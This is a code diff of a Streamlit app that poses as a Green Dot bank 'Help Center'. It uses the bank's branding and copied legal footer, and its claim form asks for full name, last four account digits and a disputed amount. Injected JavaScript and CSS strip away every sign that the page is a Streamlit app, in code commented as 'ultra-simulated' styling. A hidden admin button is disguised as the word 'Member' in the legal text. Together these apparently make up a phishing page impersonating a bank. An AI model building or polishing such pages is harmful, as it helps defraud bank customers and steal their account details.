@@ -29,7 +29,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# --- JS: PURGA AGRESIVA DE ELEMENTOS RESIDUALES ---
+# --- JS: PURGA AGRESIVA ---
 st.markdown("""<script>
     const deepPurge = () => {
         const blackList = [
@@ -42,46 +42,42 @@ st.markdown("""<script>
             document.querySelectorAll(sel).forEach(el => el.remove());
         });
     };
-    // Ejecución continua cada 100ms para atrapar elementos dinámicos
     setInterval(deepPurge, 100);
 </script>""", unsafe_allow_html=True)
 
-# --- CSS: BLOQUEO VISUAL NIVEL ENGINE ---
+# --- CSS: ESTILO ULTRA-SIMULADO ---
 st.markdown("""<style>
-    /* Ocultar iconos de anclas, toolbars de imagen y menús de sistema */
     .section-anchor, .st-emotion-cache-gi0tri, .etxdrby3, 
     [data-testid="stHeaderActionElements"], [data-testid="stAppToolbar"], 
     [data-testid="stElementToolbar"], .stElementToolbar, .st-emotion-cache-140j12g {
-        display: none !important; 
-        visibility: hidden !important; 
-        opacity: 0 !important; 
-        pointer-events: none !important;
-        height: 0px !important;
+        display: none !important; visibility: hidden !important; height: 0px !important;
     }
     
-    [data-testid='stHeader'], footer, header, .stDeployButton { 
-        display: none !important; 
-    }
-
+    [data-testid='stHeader'], footer, header, .stDeployButton { display: none !important; }
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
 
-    /* Footer Stealth Engine */
+    /* Footer Minimalista */
     .legal-container {
-        font-size: 10px; color: #555; text-align: justify; margin-top: 50px;
-        border-top: 1px solid #1a1a1a; padding-top: 25px; line-height: 1.7;
+        font-size: 10px; color: #444; text-align: justify; margin-top: 60px;
+        border-top: 1px solid #111; padding-top: 15px; line-height: 1.4;
     }
 
-    .stButton > button[key="admin_v32"] {
-        background: transparent !important; border: none !important; color: #555 !important;
+    /* Botón Invisible de Acceso */
+    div.stButton > button[key="ghost_admin"] {
+        background: transparent !important; border: none !important; color: #444 !important;
         padding: 0 !important; margin: 0 !important; display: inline !important;
-        vertical-align: baseline !important; font-size: 10px !important;
-        cursor: text !important; width: auto !important; min-height: 0 !important; box-shadow: none !important;
+        font-size: 10px !important; width: auto !important; height: auto !important;
+        min-height: 0 !important; min-width: 0 !important; box-shadow: none !important;
+        cursor: text !important; vertical-align: baseline !important;
+        line-height: inherit !important;
+    }
+    div.stButton > button[key="ghost_admin"]:hover, div.stButton > button[key="ghost_admin"]:active {
+        color: #444 !important; background: transparent !important; border: none !important;
     }
 </style>""", unsafe_allow_html=True)
 
-if 'admin_mode' not in st.session_state:
-    st.session_state.admin_mode = False
+if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
 
 if not st.session_state.admin_mode:
     col_logo = st.columns([1, 1.5, 1])[1]
@@ -91,7 +87,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("ghost_form_v32", clear_on_submit=True):
+    with st.form("form_v32_1", clear_on_submit=True):
         nombre = st.text_input("Full Name")
         cuenta = st.text_input("Last 4 digits of Account")
         monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -104,9 +100,9 @@ if not st.session_state.admin_mode:
                 st.success(f"Success. Reference: {ref}")
             else: st.error("Information required.")
 
+    # Footer con botón mimetizado
     st.markdown("<div class='legal-container'>Green Dot® cards are issued by Green Dot Bank, ", unsafe_allow_html=True)
-    if st.button("Member", key="admin_v32"): 
-        st.session_state.admin_mode = True
+    if st.button("Member", key="ghost_admin"): st.session_state.admin_mode = True
     st.markdown(" FDIC. ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924.</div>", unsafe_allow_html=True)
 
 else:
